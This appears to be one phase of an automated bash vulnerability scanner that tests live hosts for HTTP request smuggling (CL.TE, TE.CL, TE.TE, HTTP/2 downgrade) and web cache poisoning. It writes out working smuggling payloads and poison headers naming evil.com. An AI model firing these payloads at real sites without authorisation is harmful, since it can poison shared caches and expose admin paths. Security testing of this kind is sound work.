#======================= PHASE 18: HTTP REQUEST SMUGGLING + WEB CACHE POISONING =======================
# CL.TE, TE.CL, HTTP/2 downgrade smuggling; cache poisoning via headers

_smuggling_cl_te() {
    local URL="$1"
    local SMG_DIR="$2"
    local HOST
    HOST=$(echo "$URL" | awk -F/ '{print $3}')

    # CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding
    local CL_TE_PAYLOAD
    CL_TE_PAYLOAD=$(printf 'POST / HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG' "$HOST")

    # Canary: send smuggled request via curl (nc -q is not portable on Windows/WSL)
    local HTTP_SMUGGLE_RESP
    HTTP_SMUGGLE_RESP=$(curl_safe -sk -X POST "$URL" \
        -H "Content-Length: 6" \
        -H "Transfer-Encoding: chunked" \
        -H "Transfer-Encoding: x-chunked" \
        --data $'0\r\n\r\nGET /admin HTTP/1.1\r\nHost: '"$HOST"$'\r\n\r\n' \
        --max-time 10 2>/dev/null | head -c 1000)

    if echo "$HTTP_SMUGGLE_RESP" | grep -qiE "admin|dashboard|unauthorized|403|400 bad"; then
        echo "CL.TE possible: $URL" >> "$SMG_DIR/smuggling_candidates.txt"
        vuln "HTTP SMUGGLING (CL.TE): $URL — absorbed smuggled request"
        notify_vuln "critical" "HTTP Request Smuggling CL.TE: $URL — admin path absorbed"
    fi
}

_smuggling_te_cl() {
    local URL="$1"
    local SMG_DIR="$2"
    local HOST
    HOST=$(echo "$URL" | awk -F/ '{print $3}')

    # TE.CL: front-end uses Transfer-Encoding, back-end uses Content-Length
    local TE_CL_RESP
    TE_CL_RESP=$(curl_safe -sk -X POST "$URL" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Transfer-Encoding: chunked" \
        --data $'5c\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n' \
        --http1.1 \
        --max-time 10 2>/dev/null | head -c 1000)

    if echo "$TE_CL_RESP" | grep -qiE "GPOST|unrecognized method|invalid"; then
        echo "TE.CL possible: $URL" >> "$SMG_DIR/smuggling_candidates.txt"
        vuln "HTTP SMUGGLING (TE.CL): $URL — GPOST method smuggled"
        notify_vuln "critical" "HTTP Request Smuggling TE.CL: $URL"
    fi
}

_smuggling_te_te() {
    local URL="$1"
    local SMG_DIR="$2"

    # TE.TE: both servers use TE but one can be confused with obfuscated header
    local -a TE_OBFUSCATIONS=(
        "Transfer-Encoding: xchunked"
        "Transfer-Encoding : chunked"
        "Transfer-Encoding: chunked, x"
        "Transfer-Encoding: x-custom-tag, chunked"
        $'Transfer-Encoding:\tchunked'
        "X-Transfer-Encoding: chunked"
    )

    for TE_HDR in "${TE_OBFUSCATIONS[@]}"; do
        local RESP_CODE
        RESP_CODE=$(curl_safe -sk -o /dev/null -w "%{http_code}" \
            -X POST "$URL" \
            -H "Transfer-Encoding: chunked" \
            -H "$TE_HDR" \
            --data $'0\r\n\r\n' \
            --http1.1 \
            --max-time 8 2>/dev/null || echo "000")
        if [[ "$RESP_CODE" =~ ^[23] ]]; then
            echo "TE.TE candidate: $URL | header: $TE_HDR" >> "$SMG_DIR/tete_candidates.txt"
        fi
    done
}

_smuggling_h2_downgrade() {
    local URL="$1"
    local SMG_DIR="$2"
    local HOST
    HOST=$(echo "$URL" | awk -F/ '{print $3}')

    # HTTP/2 to HTTP/1.1 downgrade smuggling
    # Use curl --http2 to send malformed TE header that H2 strips but H1.1 proxy sees
    local RESP
    RESP=$(curl_safe -sk --http2 \
        -X POST "$URL" \
        -H "Transfer-Encoding: chunked" \
        -H "Content-Length: 4" \
        -d $'0\r\n\r\n' \
        -o /dev/null -w "%{http_code}" \
        --max-time 10 2>/dev/null || echo "000")

    if [[ "$RESP" =~ ^[23] ]]; then
        echo "H2 downgrade candidate: $URL" >> "$SMG_DIR/h2_downgrade.txt"
    fi
}

_cache_poison_test() {
    local URL="$1"
    local SMG_DIR="$2"
    local HOST
    HOST=$(echo "$URL" | awk -F/ '{print $3}')
    local CACHE_BUSTER
    CACHE_BUSTER=$(date +%s%3N)

    log "[Cache] Testing cache poisoning on $URL..."

    local POISON_HEADERS=(
        "X-Forwarded-Host: evil.com"
        "X-Forwarded-Scheme: nothttps"
        "X-Forwarded-Port: 1337"
        "X-Original-URL: /admin"
        "X-Rewrite-URL: /admin"
        "X-Host: evil.com"
        "Forwarded: host=evil.com"
    )

    local CB_URL="${URL}?cb=${CACHE_BUSTER}"

    for HDR in "${POISON_HEADERS[@]}"; do
        local RESP1 RESP2
        # Send poison request
        RESP1=$(curl_safe -sk "$CB_URL" -H "$HDR" 2>/dev/null | head -c 2000)
        # Probe cache — same URL without poison header
        RESP2=$(curl_safe -sk "$CB_URL" 2>/dev/null | head -c 2000)

        local HDR_KEY
        HDR_KEY=$(echo "$HDR" | cut -d: -f1)
        local HDR_VAL
        HDR_VAL=$(echo "$HDR" | cut -d' ' -f2-)

        # Check if poison value appears in cached response
        if echo "$RESP2" | grep -qF "$HDR_VAL"; then
            echo "CACHE POISONED: $URL | Header: $HDR" >> "$SMG_DIR/cache_poison_hits.txt"
            vuln "WEB CACHE POISONING: $URL poisoned via $HDR_KEY"
            notify_vuln "high" "Web Cache Poisoning: $URL — $HDR_KEY reflected in cached response"
        fi
    done

    # HTTP host header poisoning via X-Forwarded-Host
    local EVIL_RESP
    EVIL_RESP=$(curl_safe -sk "${URL}?cb=${CACHE_BUSTER}_xfh" \
        -H "X-Forwarded-Host: evil.com" 2>/dev/null | head -c 3000)
    if echo "$EVIL_RESP" | grep -q "evil.com"; then
        echo "HOST HEADER REFLECTED: $URL" >> "$SMG_DIR/cache_poison_hits.txt"
        vuln "HOST HEADER INJECTION + CACHE POISON candidate: $URL"
    fi

    # Fat GET smuggling (cache poisoning via GET body)
    local FAT_GET_RESP
    FAT_GET_RESP=$(curl_safe -sk -X GET "$URL" \
        -H "Content-Length: 41" \
        -d "GET /admin HTTP/1.1\r\nHost: ${HOST}\r\n\r\n" \
        --max-time 10 2>/dev/null | head -c 500)
    if echo "$FAT_GET_RESP" | grep -qiE "admin|dashboard|unauthorized"; then
        echo "FAT GET poison: $URL" >> "$SMG_DIR/cache_poison_hits.txt"
    fi
}

_cache_headers_audit() {
    local URL="$1"
    local SMG_DIR="$2"

    # Check cache headers for security misconfiguration
    local RESP_HDRS
    RESP_HDRS=$(curl_safe -skI "$URL" 2>/dev/null)

    # Cacheable sensitive pages
    local CACHE_CTRL
    CACHE_CTRL=$(echo "$RESP_HDRS" | grep -i "cache-control" | head -1)
    local SET_COOKIE
    SET_COOKIE=$(echo "$RESP_HDRS" | grep -i "set-cookie" | head -1)

    if [ -n "$SET_COOKIE" ] && ! echo "$CACHE_CTRL" | grep -qiE "no-store|no-cache|private"; then
        echo "CACHEABLE+COOKIE: $URL | Cache-Control: $CACHE_CTRL" >> "$SMG_DIR/cache_misconfig.txt"
        vuln "CACHEABLE RESPONSE WITH SET-COOKIE: $URL"
    fi

    # Vary header missing (cache key missing headers)
    if ! echo "$RESP_HDRS" | grep -qi "Vary: Accept-Encoding"; then
        echo "Missing Vary: $URL" >> "$SMG_DIR/cache_misconfig.txt" 2>/dev/null || true
    fi
}

phase_18_smuggling() {
    if phase_done "phase_18"; then return 0; fi
    [ "$SMUGGLING_MODE" -ne 1 ] && { info "Smuggling mode disabled — skipping phase 18"; return; }
    phase_banner "PHASE 18: HTTP REQUEST SMUGGLING + WEB CACHE POISONING"

    local START_TIME
    START_TIME=$(date +%s)
    local SMG_DIR="$OUTDIR/advanced/smuggling"
    mkdir -p "$SMG_DIR"

    : > "$SMG_DIR/smuggling_candidates.txt"
    : > "$SMG_DIR/tete_candidates.txt"
    : > "$SMG_DIR/h2_downgrade.txt"
    : > "$SMG_DIR/cache_poison_hits.txt"
    : > "$SMG_DIR/cache_misconfig.txt"

    local ALIVE_FILE="$OUTDIR/alive/final_alive.txt"
    [ -s "$ALIVE_FILE" ] || { warning "No alive hosts — skipping phase 18"; return; }

    local IDX=0
    while IFS= read -r URL && [ $IDX -lt 30 ]; do
        IDX=$(( IDX + 1 ))
        progress_bar "Smuggling" "$IDX" "30"
        log "[18] Testing $URL..."

        # ── [18.1] CL.TE Smuggling ───────────────────────────
        _smuggling_cl_te "$URL" "$SMG_DIR" &

        # ── [18.2] TE.CL Smuggling ───────────────────────────
        _smuggling_te_cl "$URL" "$SMG_DIR" &

        # ── [18.3] TE.TE obfuscation ─────────────────────────
        _smuggling_te_te "$URL" "$SMG_DIR" &

        # ── [18.4] H2 downgrade ──────────────────────────────
        [[ "$URL" == https://* ]] && _smuggling_h2_downgrade "$URL" "$SMG_DIR" &

        # ── [18.5] Cache poisoning ────────────────────────────
        _cache_poison_test "$URL" "$SMG_DIR" &
        _cache_headers_audit "$URL" "$SMG_DIR" &

        # Control parallel jobs (POSIX-safe arithmetic check)
        if [ $(( IDX % 5 )) -eq 0 ]; then wait; fi
    done < "$ALIVE_FILE"
    wait
    echo ""

    # ── [18.6] Nuclei smuggling templates ─────────────────────
    if command -v nuclei &>/dev/null && [ -d "$NUCLEI_TEMPLATES" ]; then
        log "[18.6] Running nuclei HTTP smuggling templates..."
        nuclei \
            -l "$ALIVE_FILE" \
            -t "$NUCLEI_TEMPLATES/http/vulnerabilities/http-request-smuggling*" \
            -t "$NUCLEI_TEMPLATES/http/vulnerabilities/cache*" \
            -silent -json \
            -o "$SMG_DIR/nuclei_smuggling.jsonl" \
            2>/dev/null || true
    fi

    local SMG_CNT CACHE_CNT
    SMG_CNT=$(wc -l < "$SMG_DIR/smuggling_candidates.txt" 2>/dev/null || echo 0)
    CACHE_CNT=$(wc -l < "$SMG_DIR/cache_poison_hits.txt" 2>/dev/null || echo 0)

    success "PHASE 18 DONE — Smuggling candidates: $SMG_CNT | Cache poison: $CACHE_CNT | Time: $(( $(date +%s) - $START_TIME ))s"
    notify "Phase 18: Smuggling done — $SMG_CNT smuggling + $CACHE_CNT cache poisoning findings" "📦"
    mark_done "phase_18"
    echo ""
}
